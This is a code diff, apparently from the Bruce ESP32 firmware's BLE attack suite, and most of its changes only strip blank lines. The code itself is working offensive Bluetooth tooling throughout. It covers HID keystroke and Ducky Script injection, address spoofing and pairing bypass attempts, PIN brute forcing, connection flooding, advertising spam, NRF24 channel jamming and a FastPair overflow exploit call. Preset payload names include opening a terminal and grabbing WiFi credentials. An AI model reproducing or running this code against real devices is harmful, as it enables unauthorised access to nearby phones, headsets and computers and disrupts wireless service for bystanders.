         showAttackResult(false, "Failed to create client after exploit");
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Finding HID service...", TFT_GREEN);
     NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
     if(!pHIDService) {
@@ -2570,7 +2206,6 @@ bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pReportChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
     for(auto& ch : chars) {
@@ -2580,7 +2215,6 @@ bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script
             break;
         }
     }
-
     if(!pReportChar) {
         showAttackResult(false, "No writable HID characteristic");
         pClient->disconnect();
@@ -2588,15 +2222,12 @@ bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     showAttackProgress("Executing Ducky Script...", TFT_BLUE);
     std::vector<DuckyCommand> commands = duckyEngine.getCommands();
     bool success = true;
     int currentDelay = defaultDelay;
-
     for(size_t i = 0; i < commands.size(); i++) {
         DuckyCommand cmd = commands[i];
-
         if(cmd.command == "DELAY") delay(cmd.delay_ms);
         else if(cmd.command == "DEFAULT_DELAY") currentDelay = cmd.delay_ms;
         else if(cmd.command == "STRING") {
@@ -2615,13 +2246,11 @@ bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script
             delay(currentDelay);
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
     delay(300);
-
     if(success) {
         showAttackResult(true, "Ducky Script injected!");
     } else {
@@ -2667,26 +2296,20 @@ bool AuthBypassEngine::attemptSpoofConnection(NimBLEAddress target, const String
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String spoofAddress = getSpoofAddress(targetName);
     showAttackProgress(String("Spoofing as: " + spoofAddress).c_str(), TFT_CYAN);
-
     BLEStateManager::deinitBLE(true);
     delay(500);
     std::string spoofAddrStr = spoofAddress.c_str();
     NimBLEDevice::init(spoofAddrStr);
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(true, true, true);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(8);
     pClient->setConnectionParams(12, 12, 0, 400);
     bool connected = pClient->connect(target, true);
-
     if(connected) {
         showAttackProgress("Spoof connection successful!", TFT_GREEN);
         pClient->disconnect();
@@ -2704,22 +2327,17 @@ bool AuthBypassEngine::forceRepairing(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Attempting forced re-pairing...", TFT_YELLOW);
     BLEStateManager::deinitBLE(true);
     delay(500);
     std::string forceName = "Forced-Pair";
     NimBLEDevice::init(forceName);
     NimBLEDevice::setSecurityAuth(false, false, false);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(10);
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         showAttackProgress("Forced pairing successful!", TFT_GREEN);
         if(pClient->secureConnection()) showAttackProgress("Bonding established!", TFT_GREEN);
@@ -2738,22 +2356,17 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Testing authentication bypass...", TFT_ORANGE);
     BLEStateManager::deinitBLE(true);
     delay(500);
     std::string zeroKeyName = "Zero-Key-Auth";
     NimBLEDevice::init(zeroKeyName);
     NimBLEDevice::setSecurityAuth(true, false, false);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(8);
     bool connected = pClient->connect(target, true);
-
     if(connected) {
         showAttackProgress("Zero-key auth bypass worked!", TFT_GREEN);
         pClient->disconnect();
@@ -2764,21 +2377,16 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     }
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
-
     BLEStateManager::deinitBLE(true);
     delay(500);
     std::string legacyName = "Legacy-Pair";
     NimBLEDevice::init(legacyName);
     NimBLEDevice::setSecurityAuth(false, true, false);
-
     pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(10);
     connected = pClient->connect(target, true);
-
     if(connected) {
         showAttackProgress("Legacy pairing bypass worked!", TFT_GREEN);
         pClient->disconnect();
@@ -2801,15 +2409,11 @@ bool MultiConnectionAttack::connectionFloodSingle(NimBLEAddress target, int time
     std::string floodName = "Bruce-Flooder";
     NimBLEDevice::init(floodName);
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(timeout);
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         activeConnections.push_back(pClient);
         return true;
@@ -2823,10 +2427,8 @@ bool MultiConnectionAttack::connectionFlood(std::vector<NimBLEAddress> targets, 
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("WARNING: Connection flood may disrupt BLE. Continue?")) return false;
     showAttackProgress("Starting connection flood...", TFT_ORANGE);
-
     bool anySuccess = false;
     for(int attempt = 0; attempt < attemptsPerTarget; attempt++) {
         showAttackProgress(String("Flood attempt " + String(attempt+1) + "/" + String(attemptsPerTarget)).c_str(), TFT_YELLOW);
@@ -2835,7 +2437,6 @@ bool MultiConnectionAttack::connectionFlood(std::vector<NimBLEAddress> targets, 
             delay(50);
         }
     }
-
     this->cleanup();
     cleanup.disable();
     if(anySuccess) showAttackResult(true, "Connection flood completed");
@@ -2849,15 +2450,12 @@ bool MultiConnectionAttack::advertisingSpamSingle(NimBLEAddress target) {
     std::string spamName = "Bruce-Spammer";
     NimBLEDevice::init(spamName);
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     if(!pAdvertising) return false;
-
     uint8_t bruceData[] = {0xFF, 0xFF, 'B', 'R', 'U', 'C', 'E'};
     pAdvertising->setManufacturerData(bruceData, sizeof(bruceData));
     pAdvertising->setName("Bruce-Spammer");
     pAdvertising->addServiceUUID(NimBLEUUID("12345678-1234-5678-1234-567812345678"));
-
     pAdvertising->start(0);
     delay(100);
     pAdvertising->stop();
@@ -2868,14 +2466,11 @@ bool MultiConnectionAttack::advertisingSpam(std::vector<NimBLEAddress> targets) 
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("WARNING: This will spam BLE ads. Continue?")) return false;
     showAttackProgress("Starting advertising spam...", TFT_ORANGE);
-
     const int SPAM_DURATION = 10000;
     unsigned long startTime = millis();
     int spamCount = 0;
-
     while(millis() - startTime < SPAM_DURATION) {
         if(check(EscPress)) break;
         for(auto& target : targets) advertisingSpamSingle(target);
@@ -2883,7 +2478,6 @@ bool MultiConnectionAttack::advertisingSpam(std::vector<NimBLEAddress> targets) 
         if(spamCount % 10 == 0) showAttackProgress(String("Spammed " + String(spamCount) + " advertisements").c_str(), TFT_YELLOW);
         delay(150);
     }
-
     BLEStateManager::deinitBLE(true);
     cleanup.disable();
     showAttackResult(true, String("Sent " + String(spamCount) + " spam advertisements").c_str());
@@ -2901,15 +2495,12 @@ bool MultiConnectionAttack::nrf24JamAttack(int jamMode) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Jam BLE frequencies? This may disrupt nearby devices.")) return false;
     showAttackProgress("Initializing NRF24 for BLE jamming...", TFT_WHITE);
-
     if(!isNRF24Available()) {
         showAttackResult(false, "NRF24 module not available");
         return false;
     }
-
     BLEJamMode bleMode;
     switch(jamMode) {
         case 0: bleMode = BLE_JAM_ADV_CHANNELS; break;
@@ -2917,10 +2508,8 @@ bool MultiConnectionAttack::nrf24JamAttack(int jamMode) {
         case 2: bleMode = BLE_JAM_HOP_ALL; break;
         default: bleMode = BLE_JAM_ADV_CHANNELS;
     }
-
     showAttackProgress("Starting BLE jamming attack...", TFT_ORANGE);
     bool success = startBLEJammer(bleMode);
-
     if(success) {
         std::vector<String> lines;
         lines.push_back("BLE JAMMER ACTIVE");
@@ -2944,37 +2533,28 @@ bool MultiConnectionAttack::jamAndConnect(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Jam BLE while attempting exploit connection?")) return false;
     showAttackProgress("Jam & Connect attack starting...", TFT_ORANGE);
-
     bool jamStarted = jamBLEAdvertisingChannels();
     if(!jamStarted) {
         showAttackResult(false, "Failed to start jamming");
         return false;
     }
-
     delay(300);
     showAttackProgress("Jamming active - attempting connection...", TFT_YELLOW);
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     stopBLEJammer();
     delay(200);
-
     if(pClient) {
         BLEStateManager::registerClient(pClient);
-
         showAttackProgress("Connected! Testing for exploit...", TFT_GREEN);
         WhisperPairExploit exploit;
         bool exploitSuccess = exploit.executeSilent(target);
-
         pClient->disconnect();
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
-
         cleanup.disable();
-
         if(exploitSuccess) showAttackResult(true, "Jam & Connect exploit successful!");
         else showAttackResult(true, "Connected but exploit failed");
         return true;
@@ -3001,37 +2581,30 @@ void VulnerabilityScanner::scanDevice(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Scanning for vulnerabilities...", TFT_BLUE);
     WhisperPairExploit exploit;
     bool fastPairVuln = exploit.executeSilent(target);
-
     std::vector<String> lines;
     lines.push_back("VULNERABILITY SCAN REPORT");
     lines.push_back("Target: " + String(target.toString().c_str()));
     lines.push_back("FastPair Buffer Overflow: " + String(fastPairVuln ? "VULNERABLE" : "SAFE"));
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(pClient) {
         BLEStateManager::registerClient(pClient);
-
         bool hasHID = false;
         bool hasAVRCP = false;
         bool writeAccess = false;
-
         const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
         for(auto& service : services) {
             std::string uuidStr = service->getUUID().toString();
             if(uuidStr.find("1812") != std::string::npos) hasHID = true;
             if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) hasAVRCP = true;
-
             const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
             for(auto& ch : chars) {
                 if(ch->canWrite()) { writeAccess = true; break; }
             }
         }
-
         lines.push_back("HID Service Present: " + String(hasHID ? "YES" : "NO"));
         lines.push_back("AVRCP Service Present: " + String(hasAVRCP ? "YES" : "NO"));
         lines.push_back("Write Access Available: " + String(writeAccess ? "YES" : "NO"));
@@ -3039,7 +2612,6 @@ void VulnerabilityScanner::scanDevice(NimBLEAddress target) {
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
     }
-
     cleanup.disable();
     showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
 }
@@ -3067,12 +2639,9 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Attempt HID keystroke injection?")) return false;
-
     bool hasHFP = false;
     String deviceName = "";
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -3083,7 +2652,6 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP && !deviceName.isEmpty()) {
         showAttackProgress("Trying HFP exploit first...", TFT_CYAN);
         HFPExploitEngine hfp;
@@ -3093,16 +2661,13 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
             showAttackProgress("HFP failed, trying direct HID...", TFT_ORANGE);
         }
     }
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Finding HID service...", TFT_GREEN);
     NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
     if(!pHIDService) {
@@ -3112,7 +2677,6 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pReportChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
     for(auto& ch : chars) {
@@ -3122,7 +2686,6 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
             break;
         }
     }
-
     if(!pReportChar) {
         showAttackResult(false, "No writable HID characteristic");
         pClient->disconnect();
@@ -3130,22 +2693,18 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     bool anySent = false;
     uint8_t enterKey[] = {0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent1 = pReportChar->writeValue(enterKey, sizeof(enterKey), true);
     if(sent1) anySent = true;
     delay(300);
-
     uint8_t windowsKey[] = {0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent2 = pReportChar->writeValue(windowsKey, sizeof(windowsKey), true);
     if(sent2) anySent = true;
     delay(300);
-
     uint8_t nullReport[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent3 = pReportChar->writeValue(nullReport, sizeof(nullReport), true);
     if(sent3) anySent = true;
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
@@ -3158,26 +2717,20 @@ bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const Strin
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     HIDExploitEngine hidExploit;
     HIDConnectionResult connResult = hidExploit.forceHIDConnection(target, deviceName, rssi);
-
     if(!connResult.success) {
         showAttackResult(false, "Failed to establish HID connection");
         return false;
     }
-
     NimBLEClient* pClient = nullptr;
     String connectionMethod = "";
     pClient = attemptConnectionWithStrategies(target, connectionMethod);
-
     if(!pClient) {
         showAttackResult(false, "Failed to create client after exploit");
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Finding HID service...", TFT_GREEN);
     NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
     if(!pHIDService) {
@@ -3187,7 +2740,6 @@ bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const Strin
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pReportChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
     for(auto& ch : chars) {
@@ -3197,7 +2749,6 @@ bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const Strin
             break;
         }
     }
-
     if(!pReportChar) {
         showAttackResult(false, "No writable HID characteristic");
         pClient->disconnect();
@@ -3205,28 +2756,23 @@ bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const Strin
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     bool anySent = false;
     uint8_t enterKey[] = {0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent1 = pReportChar->writeValue(enterKey, sizeof(enterKey), true);
     if(sent1) anySent = true;
     delay(300);
-
     uint8_t windowsKey[] = {0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent2 = pReportChar->writeValue(windowsKey, sizeof(windowsKey), true);
     if(sent2) anySent = true;
     delay(300);
-
     uint8_t nullReport[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     bool sent3 = pReportChar->writeValue(nullReport, sizeof(nullReport), true);
     if(sent3) anySent = true;
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
     delay(300);
-
     if(anySent) showAttackResult(true, "Forced HID keystrokes sent!");
     else showAttackResult(false, "Failed to send keystrokes");
     return anySent;
@@ -3236,36 +2782,29 @@ bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Attempt PIN brute force?")) return false;
-
     const char* commonPins[] = {
         "0000", "1234", "1111", "2222", "3333",
         "4444", "5555", "6666", "7777", "8888",
         "9999", "1212", "1004", "2000", "3000",
         nullptr
     };
-
     bool success = false;
     for(int i = 0; commonPins[i] != nullptr; i++) {
         showAttackProgress(String("Trying PIN: " + String(commonPins[i])).c_str(), TFT_YELLOW);
-
         BLEStateManager::deinitBLE(true);
         delay(300);
         std::string pinName = "Bruce-PINBrute";
         NimBLEDevice::init(pinName);
         NimBLEDevice::setSecurityAuth(true, true, true);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(5);
             if(pClient->connect(target, true)) {
                 showAttackProgress(String("Connected with PIN: " + String(commonPins[i])).c_str(), TFT_GREEN);
                 success = true;
-
                 std::vector<String> lines;
                 lines.push_back("PIN BRUTE FORCE SUCCESS!");
                 lines.push_back(String("Target: ") + String(target.toString().c_str()));
@@ -3273,7 +2812,6 @@ bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
                 lines.push_back("");
                 lines.push_back("Device vulnerable to weak");
                 lines.push_back("PIN authentication");
-
                 showDeviceInfoScreen("PIN CRACKED", lines, TFT_GREEN, TFT_BLACK);
                 pClient->disconnect();
                 BLEStateManager::unregisterClient(pClient);
@@ -3285,7 +2823,6 @@ bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
         }
         delay(500);
     }
-
     cleanup.disable();
     if(!success) showAttackResult(false, "All common PINs failed");
     return success;
@@ -3295,25 +2832,20 @@ bool DoSAttackServiceClass::connectionFlood(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("WARNING: This may disrupt BLE. Continue?")) return false;
     showAttackProgress("Starting connection flood...", TFT_ORANGE);
-
     bool anySuccess = false;
     const int MAX_ATTEMPTS = 20;
     for(int i = 0; i < MAX_ATTEMPTS; i++) {
         showAttackProgress(String("Flood attempt " + String(i+1) + "/" + String(MAX_ATTEMPTS)).c_str(), TFT_YELLOW);
-
         BLEStateManager::deinitBLE(true);
         delay(100);
         std::string floodName = "Bruce-Flooder";
         NimBLEDevice::init(floodName);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(2);
             bool connected = pClient->connect(target, false);
             if(connected) anySuccess = true;
@@ -3322,7 +2854,6 @@ bool DoSAttackServiceClass::connectionFlood(NimBLEAddress target) {
         }
         delay(50);
     }
-
     cleanup.disable();
     if(anySuccess) showAttackResult(true, "Connection flood completed");
     else showAttackResult(false, "Flood attack failed");
@@ -3333,31 +2864,25 @@ bool DoSAttackServiceClass::advertisingSpam(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("WARNING: This will spam BLE ads. Continue?")) return false;
     showAttackProgress("Starting advertising spam...", TFT_ORANGE);
-
     BLEStateManager::deinitBLE(true);
     delay(300);
     std::string spamName = "Bruce-Spammer";
     NimBLEDevice::init(spamName);
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     if(!pAdvertising) {
         showAttackResult(false, "Failed to get advertising");
         return false;
     }
-
     uint8_t spamData[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     pAdvertising->setManufacturerData(spamData, sizeof(spamData));
     pAdvertising->setName("Bruce-Spammer");
     pAdvertising->addServiceUUID(NimBLEUUID("12345678-1234-5678-1234-567812345678"));
-
     const int SPAM_DURATION = 10000;
     unsigned long startTime = millis();
     int spamCount = 0;
-
     while(millis() - startTime < SPAM_DURATION) {
         if(check(EscPress)) break;
         pAdvertising->start(0);
@@ -3367,7 +2892,6 @@ bool DoSAttackServiceClass::advertisingSpam(NimBLEAddress target) {
         spamCount++;
         if(spamCount % 10 == 0) showAttackProgress(String("Spammed " + String(spamCount) + " advertisements").c_str(), TFT_YELLOW);
     }
-
     pAdvertising->stop();
     cleanup.disable();
     showAttackResult(true, String("Sent " + String(spamCount) + " spam advertisements").c_str());
@@ -3379,17 +2903,14 @@ String selectFileFromSD() {
         showErrorMessage("SD Card not found");
         return "";
     }
-
     const int MAX_FILES = 30;
     String files[MAX_FILES];
     int fileCount = 0;
-
     File root = SD.open("/");
     if(!root) {
         showErrorMessage("Cannot open SD");
         return "";
     }
-
     File file = root.openNextFile();
     while(file && fileCount < MAX_FILES) {
         String filename = file.name();
@@ -3401,12 +2922,10 @@ String selectFileFromSD() {
         file = root.openNextFile();
     }
     root.close();
-
     if(fileCount == 0) {
         showErrorMessage("No files found");
         return "";
     }
-
     int selected = 0;
     int scrollOffset = 0;
     bool exitMenu = false;
@@ -3414,28 +2933,23 @@ String selectFileFromSD() {
     int menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > fileCount) maxVisibleItems = fileCount;
-
     while(!exitMenu) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("SD CARD FILES") * 12) / 2, 15);
         tft.print("SD CARD FILES");
         tft.setTextSize(1);
-
         tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
         tft.setCursor(20, 40);
         tft.print("Found: ");
         tft.print(fileCount);
         tft.print(" files");
-
         for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < fileCount; i++) {
             int fileIdx = scrollOffset + i;
             int yPos = menuStartY + (i * menuItemHeight);
             if(yPos + menuItemHeight > tftHeight - 45) break;
-
             if(fileIdx == selected) {
                 tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -3447,12 +2961,10 @@ String selectFileFromSD() {
                 tft.setCursor(25, yPos + 8);
                 tft.print("  ");
             }
-
             String displayName = files[fileIdx];
             if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
             tft.print(displayName);
         }
-
         if(fileCount > maxVisibleItems) {
             tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
             tft.setCursor(tftWidth - 25, menuStartY + 5);
@@ -3460,11 +2972,9 @@ String selectFileFromSD() {
             tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
             if(scrollOffset + maxVisibleItems < fileCount) tft.print("v");
         }
-
         tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -3506,25 +3016,21 @@ bool loadScriptFromSD(String filename) {
         showErrorMessage("SD Card failed");
         return false;
     }
-
     File file = SD.open(filename);
     if(!file) {
         String errorMsg = "Cannot open file: " + filename;
         showErrorMessage(errorMsg.c_str());
         return false;
     }
-
     globalScript = "";
     while(file.available()) {
         globalScript += (char)file.read();
     }
     file.close();
-
     if(globalScript.length() == 0) {
         showErrorMessage("File is empty");
         return false;
     }
-
     return true;
 }
 
@@ -3532,7 +3038,6 @@ String getScriptFromUser() {
     const int MAX_SCRIPTS = 10;
     String scripts[MAX_SCRIPTS];
     int scriptCount = 0;
-
     scripts[scriptCount++] = "Example: Open Calculator";
     scripts[scriptCount++] = "Example: Open CMD/Terminal";
     scripts[scriptCount++] = "Example: WiFi Credentials";
@@ -3540,7 +3045,6 @@ String getScriptFromUser() {
     scripts[scriptCount++] = "Example: Rickroll";
     scripts[scriptCount++] = "Load from SD";
     scripts[scriptCount++] = "Cancel";
-
     int selected = 0;
     int scrollOffset = 0;
     bool exitMenu = false;
@@ -3548,22 +3052,18 @@ String getScriptFromUser() {
     int menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > scriptCount) maxVisibleItems = scriptCount;
-
     while(!exitMenu) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("SELECT SCRIPT") * 12) / 2, 15);
         tft.print("SELECT SCRIPT");
         tft.setTextSize(1);
-
         for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < scriptCount; i++) {
             int scriptIdx = scrollOffset + i;
             int yPos = menuStartY + (i * menuItemHeight);
             if(yPos + menuItemHeight > tftHeight - 45) break;
-
             if(scriptIdx == selected) {
                 tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -3575,12 +3075,10 @@ String getScriptFromUser() {
                 tft.setCursor(25, yPos + 8);
                 tft.print("  ");
             }
-
             String displayName = scripts[scriptIdx];
             if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
             tft.print(displayName);
         }
-
         if(scriptCount > maxVisibleItems) {
             tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
             tft.setCursor(tftWidth - 25, menuStartY + 5);
@@ -3588,11 +3086,9 @@ String getScriptFromUser() {
             tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
             if(scrollOffset + maxVisibleItems < scriptCount) tft.print("v");
         }
-
         tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -3621,7 +3117,6 @@ String getScriptFromUser() {
                 inputProcessed = true;
             } else if(check(SelPress)) {
                 delay(200);
-
                 if(selected == scriptCount - 1) {
                     return "";
                 } else if(scripts[selected] == "Load from SD") {
@@ -3648,7 +3143,6 @@ String getScriptFromUser() {
                         return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 300\nENTER";
                     }
                 }
-
                 inputProcessed = true;
             }
             if(!inputProcessed) delay(50);
@@ -3659,75 +3153,55 @@ String getScriptFromUser() {
 
 String selectTargetFromScan(const char* title) {
     scannerData.clear();
-
     tft.fillScreen(TFT_GRAY);
     tft.setTextSize(3);
     tft.setTextColor(TFT_PURPLE, TFT_GRAY);
     tft.setCursor((tftWidth - tft.textWidth("BRUCE")) / 2, 40);
     tft.print("BRUCE");
-
     tft.setTextColor(TFT_BLUE, TFT_GRAY);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - tft.textWidth("BLE SUITE")) / 2, 90);
     tft.print("BLE SUITE");
-
     tft.setTextColor(TFT_GREEN, TFT_GRAY);
     tft.setTextSize(1);
     tft.setCursor((tftWidth - tft.textWidth("by Ninja-Jr")) / 2, 130);
     tft.print("by Ninja-Jr");
     delay(1500);
-
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
     tft.print(title);
     tft.setTextSize(1);
-
     tft.setCursor(20, 60);
     tft.print("Initializing BLE...");
-
     bool wasBLEInitialized = isBLEInitialized();
     if(wasBLEInitialized) {
         BLEStateManager::deinitBLE(true);
         delay(500);
     }
-
     NimBLEDevice::init("Bruce-Scanner");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEScan* pBLEScan = NimBLEDevice::getScan();
     if(!pBLEScan) {
         showErrorMessage("Failed to create BLE scanner!");
         BLEStateManager::deinitBLE(true);
         return "";
     }
-
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(97);
     pBLEScan->setWindow(67);
     pBLEScan->setDuplicateFilter(false);
-
     tft.setCursor(20, 100);
     tft.print("Scanning for devices...");
-
